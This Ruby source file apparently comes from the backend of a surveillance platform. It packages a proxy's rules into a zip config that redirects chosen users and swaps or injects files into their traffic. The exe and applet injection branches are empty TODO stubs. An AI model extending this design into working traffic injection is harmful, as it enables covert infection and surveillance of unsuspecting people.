require_relative '../tasks'

module RCS
module DB

class ProxyTask
  include RCS::DB::NoFileTaskType
  include RCS::Tracer

  def total
    proxy = ::Proxy.find(@params['proxy_id'])
    proxy.rules.where(:enabled => true).count + 1
  end
  
  def next_entry
    proxy = ::Proxy.find(@params['proxy_id'])
    
    base = rand(10)
    progressive = 0
    redirect_user = {}
    redirect_url = []
    intercept_files = []
    vector_files = {}

    proxy.rules.where(:enabled => true).each do |rule|

      tag = proxy.redirection_tag + (base + progressive).to_s
      progressive += 1

      yield @description = "Creating rule No: #{progressive}"
      
      # use the key of the hash to avoid duplicates
      redirect_user["#{rule.ident} #{rule.ident_param}"] ||= tag

      redirect_url << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.probability} #{rule.resource}"

      intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{rule.action_param_name} #{rule.resource}"

      case rule.action
        when 'REPLACE'
          vector_files[rule.action_param_name] = Tempfile.new('rule_replace')
          vector_files[rule.action_param_name].write RCS::DB::GridFS.get(rule[:_grid][0]).read
          vector_files[rule.action_param_name].flush
        when 'INJECT-EXE'
          # TODO: generate the agent
        when 'INJECT-HTML'
          # TODO: generate the applet
      end
    end

    yield @description = "Creating binary config"

    file = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])

    Zip::ZipOutputStream.open(file) do |z|
      z.put_next_entry("redirect_user.txt")
      redirect_user.each_pair do |key, value|
        z.puts "#{key} #{value}"
      end

      z.put_next_entry("redirect_url.txt")
      redirect_url.each do |value|
        z.puts value
      end

      z.put_next_entry("intercept_file.txt")
      intercept_files.each do |value|
        z.puts value
      end

      vector_files.each_pair do |filename, file|
        z.put_next_entry("vectors/" + filename)
        z.write File.open(file.path, 'rb') {|f| f.read}
      end
    end

    trace :info, "Proxy config file size: " + File.size(file).to_s

    puts "PROXY GRID: #{proxy[:_grid]}"

    # make sure to delete the old one first
    GridFS.delete proxy[:_grid].first unless proxy[:_grid].nil?

    # save the binary config into the grid, it will be requested by NC later
    proxy[:_grid] = [ GridFS.put(File.open(file, 'rb+'){|f| f.read}, {filename: proxy[:_id].to_s}) ]
    proxy[:_grid_size] = File.size(file)

    # delete the temp file
    File.delete(file)

    proxy.configured = false
    proxy.save

  end
end

end # DB
end # RCS